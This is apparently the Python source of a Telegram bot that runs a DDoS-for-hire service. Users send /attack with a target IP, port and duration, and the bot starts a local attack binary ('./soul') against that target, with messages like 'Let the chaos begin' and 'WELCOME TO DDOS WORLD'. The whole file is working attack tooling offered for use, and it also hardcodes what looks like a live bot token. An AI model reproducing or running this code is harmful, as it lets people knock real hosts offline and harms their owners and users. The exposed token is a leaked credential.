import os
import telebot
import logging
import time
import subprocess
from threading import Thread

TOKEN = '6491841282:AAHoXNszLKVglZgydgcI4BgROoa-hvG5J1Y'
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

bot = telebot.TeleBot(TOKEN)

bot.attack_in_progress = False
bot.attack_duration = 0
bot.attack_start_time = 0

@bot.message_handler(commands=['attack'])
def handle_attack_command(message):
    chat_id = message.chat.id
    try:
        bot.send_message(chat_id, "*💣 Ready to launch an attack?*\n"
                                   "*Please provide the target IP, port, and duration in seconds.*\n"
                                   "*Example: 167.67.25 6296 60* 🔥\n"
                                   "*Let the chaos begin! 🎉*", parse_mode='Markdown')
        bot.register_next_step_handler(message, process_attack_command)

    except Exception as e:
        logging.error(f"Error in attack command: {e}")

def process_attack_command(message):
    try:
        args = message.text.split()
        if len(args) != 3:
            bot.send_message(message.chat.id, "*❗ Error!*\n"
                                               "*Please use the correct format and try again.*\n"
                                               "*Make sure to provide all three inputs! 🔄*", parse_mode='Markdown')
            return

        target_ip, target_port, duration = args[0], int(args[1]), int(args[2])

        if target_port in [8700, 20000, 443, 17500]:
            bot.send_message(message.chat.id, f"*🔒 Port {target_port} is blocked.*\n"
                                               "*Please select a different port to proceed.*", parse_mode='Markdown')
            return
        if duration >= 600:
            bot.send_message(message.chat.id, "*⏳ Maximum duration is 599 seconds.*\n"
                                               "*Please shorten the duration and try again!*", parse_mode='Markdown')
            return  

        bot.attack_in_progress = True
        bot.attack_duration = duration
        bot.attack_start_time = time.time()

        bot.send_message(message.chat.id, f"*🚀 Attack Launched! 🚀*\n\n"
                                           f"*📡 Target Host: {target_ip}*\n"
                                           f"*👉 Target Port: {target_port}*\n"
                                           f"*⏰ Duration: {duration} seconds! Let the chaos unfold! 🔥*", parse_mode='Markdown')

        attack_thread = Thread(target=run_attack, args=(target_ip, target_port, duration, message.chat.id))
        attack_thread.start()

    except Exception as e:
        logging.error(f"Error in processing attack command: {e}")

def run_attack(target_ip, target_port, duration, chat_id):
    try:
        # Set the CPU affinity to use only the first 8 cores (core 0 to 7)
        pid = os.getpid()
        os.sched_setaffinity(pid, range(8))  # Restrict to CPUs 0-7

        # Prepare the attack command
        attack_command = ['./soul', target_ip, str(target_port), str(duration)]

        # Start the attack
        process = subprocess.Popen(attack_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

        bot.send_message(chat_id, "*💥 The attack is ongoing... 💥*\n*⏳ Duration remaining: {} seconds*".format(duration), parse_mode='Markdown')

        # Wait for the process to complete
        process.wait()

        bot.send_message(chat_id, "*🔥 The attack has been completed! 🛑*\n"
                                  "*💣 Duration completed, the chaos has ended!*")

    except Exception as e:
        logging.error(f"Error in attack process: {e}")
        bot.send_message(chat_id, "*❗ Error occurred while executing the attack*.\nPlease try again.")

@bot.message_handler(commands=['myinfo'])
def myinfo_command(message):
    chat_id = message.chat.id
    response = ("*👤 USERINFO:*\n"
                "*💸 Plan: N/A*\n"
                "*⏳ Valid Until: N/A*")
    bot.send_message(chat_id, response, parse_mode='Markdown')

@bot.message_handler(commands=['start'])
def start_message(message):
    bot.send_message(message.chat.id, "*🌍 WELCOME TO DDOS WORLD!* 🎉\n\n"
                                       "*🚀 Get ready to dive into the action!*")

if __name__ == "__main__":
    bot.polling(none_stop=True)
